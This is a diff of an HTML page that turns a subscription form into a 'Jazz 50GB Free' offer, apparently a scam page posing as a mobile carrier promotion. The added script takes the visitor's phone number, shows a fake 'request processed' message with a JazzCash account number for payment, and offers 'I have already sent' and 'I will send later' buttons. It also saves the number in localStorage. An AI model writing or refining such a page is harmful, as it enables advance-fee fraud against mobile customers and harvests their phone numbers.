@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Tamashas Subscription</title>
+  <title>Jazz 50GB Free</title>
   <style>
     :root{
       --bg1:#0a1b39; --bg2:#061427; --card:#0d1323; --text:#eaf1ff;
@@ -38,17 +38,18 @@
     }
     .primary{background:var(--primary); color:white;}
     .primary:hover{background:var(--primaryHover);}
-    .whatsapp{background:var(--accent); color:white;}
+    .secondary{background:#475569; color:white;}
+    .secondary:hover{background:#334155;}
     .note{margin-top:10px; font-size:12px; color:var(--muted); text-align:center;}
     .error{color:#ff8b8b; font-size:13px; margin-top:8px; display:none;}
-    .ok{color:#86efac; font-size:13px; margin-top:8px; display:none;}
+    .ok{color:#86efac; font-size:14px; margin-top:12px; display:none; white-space:pre-line;}
+    .extra-buttons{display:none; margin-top:15px; gap:10px;}
   </style>
 </head>
 <body>
   <main class="card">
-    <h1>Tamashas Subscription</h1>
+    <h1>Jazz 50GB Free</h1>
 
-    <!-- Form -->
     <form id="subForm">
       <label for="msisdn">Enter MSISDN (10–11 digits)</label>
       <input id="msisdn" name="msisdn" type="tel" inputmode="numeric" autocomplete="tel"
@@ -71,36 +72,31 @@
       </div>
 
       <div id="msgError" class="error">Please enter a valid 10–11 digit number and select a plan.</div>
-      <div id="msgOk" class="ok">Submitted!</div>
+      <div id="msgOk" class="ok"></div>
 
       <div class="actions">
-        <button class="primary" type="submit">Process</button>
-        <a class="btn whatsapp" id="waBtn" href="https://whatsapp.com/channel/XXXXXXXX" target="_blank" rel="noopener">
-          Join WhatsApp Channel
-        </a>
+        <button class="primary" type="submit">Activate</button>
       </div>
 
-      <p class="note">We don’t share your number without consent.</p>
+      <!-- Extra choice buttons -->
+      <div class="extra-buttons" id="extraBtns">
+        <button type="button" class="primary" id="alreadySent">I have already sent</button>
+        <button type="button" class="secondary" id="willSend">I will send later</button>
+      </div>
+
+      <p class="note">Offer available for Jazz customers only.</p>
     </form>
   </main>
 
   <script>
-    // ===== CHOOSE WHAT HAPPENS ON "Process" =====
-    // Option A: Send to Formspree (collect submissions)
-    const USE_FORMSPREE = false;                 // change to true if you’ll use Formspree
-    const FORMSPREE_ENDPOINT = "https://formspree.io/f/YOUR_ID"; // replace after you create one
-
-    // Option B: No backend — just open WhatsApp with a prefilled message
-    const USE_WHATSAPP_REDIRECT = true;          // set true to use WhatsApp redirect
-    const YOUR_WHATSAPP_NUMBER = "923001234567"; // Pakistani format without +, e.g., 92300xxxxxxx
-
     const form = document.getElementById("subForm");
     const err = document.getElementById("msgError");
     const ok  = document.getElementById("msgOk");
+    const extraBtns = document.getElementById("extraBtns");
 
-    form.addEventListener("submit", async (e) => {
+    form.addEventListener("submit", (e) => {
       e.preventDefault();
-      err.style.display="none"; ok.style.display="none";
+      err.style.display="none"; ok.style.display="none"; extraBtns.style.display="none";
 
       const msisdn = (document.getElementById("msisdn").value || "").trim();
       const plan = (new FormData(form).get("plan") || "").trim();
@@ -108,22 +104,27 @@
 
       if (!valid){ err.style.display="block"; return; }
 
-      if (USE_FORMSPREE){
-        try{
-          const res = await fetch(FORMSPREE_ENDPOINT,{
-            method:"POST",
-            headers:{ "Accept":"application/json","Content-Type":"application/json" },
-            body: JSON.stringify({ msisdn, plan, source:"github-pages" })
-          });
-          if (res.ok){ ok.style.display="block"; form.reset(); }
-          else{ err.textContent="Submission failed. Check your Formspree URL."; err.style.display="block"; }
-        }catch(_){ err.textContent="Network error. Try again."; err.style.display="block"; }
-      }
+      // Show JazzCash account info
+      ok.textContent = 
+        "✅ Your request has been processed.\n\n" +
+        "Account Details:\n" +
+        "Bank: JazzCash\n" +
+        "Account Number: 03044527009";
+      ok.style.display="block";
+      extraBtns.style.display="grid";
 
-      if (USE_WHATSAPP_REDIRECT){
-        const text = encodeURIComponent(`Subscription Request\nMSISDN: ${msisdn}\nPlan: ${plan}`);
-        location.href = `https://wa.me/${YOUR_WHATSAPP_NUMBER}?text=${text}`;
-      }
+      // Save MSISDN for next page
+      localStorage.setItem("userNumber", msisdn);
+    });
+
+    // "I have already sent" → go to success page
+    document.getElementById("alreadySent").addEventListener("click", () => {
+      window.location.href = "success.html";
+    });
+
+    // "I will send later" → just hide nothing (stay here)
+    document.getElementById("willSend").addEventListener("click", () => {
+      alert("Okay! You can send later using the above account details.");
     });
   </script>
 </body>
